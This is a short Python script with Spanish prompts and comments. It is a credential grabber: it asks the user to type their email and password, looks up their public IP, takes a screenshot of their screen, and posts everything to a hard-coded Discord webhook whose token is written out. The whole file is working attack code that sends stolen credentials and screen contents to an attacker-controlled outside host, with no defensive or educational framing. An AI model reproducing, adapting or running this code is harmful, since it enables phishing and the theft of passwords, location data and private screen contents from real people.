import requests
from PIL import ImageGrab
import io

def get_public_ip():
    try:
        response = requests.get('https://api.ipify.org?format=json')
        ip_data = response.json()
        return ip_data['ip']
    except Exception as e:
        return f"Error al obtener IP pública: {e}"

def capture_screenshot():
    try:
        # Captura de pantalla
        screenshot = ImageGrab.grab()
        # Guardar en un objeto BytesIO
        buffer = io.BytesIO()
        screenshot.save(buffer, format='PNG')
        buffer.seek(0)
        return buffer
    except Exception as e:
        return f"Error al capturar la pantalla: {e}"

def send_to_webhook(email, password, ip_address, image_bytes):
    webhook_url = 'https://discord.com/api/webhooks/1269780467419185268/5AeoeVvwT40zu5i0BaW_TQDwklkDI3H6UwrlCnw5RYDMCsd441DokDn6OGAlncL77e7u'
    
    # Preparar los datos para el mensaje
    data = {
        "content": f"**Correo Electrónico:** {email}\n**Contraseña:** {password}\n**IP Pública:** {ip_address}"
    }
    
    # Enviar mensaje con los datos
    response = requests.post(webhook_url, json=data)
    if response.status_code != 204:
        print(f"Error al enviar los datos. Código de estado: {response.status_code}")
        return

    # Preparar el archivo para enviar
    files = {
        'file': ('screenshot.png', image_bytes, 'image/png')
    }
    
    # Enviar la imagen
    response = requests.post(webhook_url, files=files)
    if response.status_code == 204:
        print("Datos e imagen enviados correctamente.")
    else:
        print(f"Error al enviar la imagen. Código de estado: {response.status_code}")

def main():
    email = input("Ingrese su correo electrónico: ")
    password = input("Ingrese su contraseña: ")
    ip_address = get_public_ip()
    image_bytes = capture_screenshot()
    
    if isinstance(image_bytes, io.BytesIO):
        send_to_webhook(email, password, ip_address, image_bytes)
    else:
        print(image_bytes)  # Imprime el error en caso de fallo al capturar la pantalla

if __name__ == "__main__":
    main()
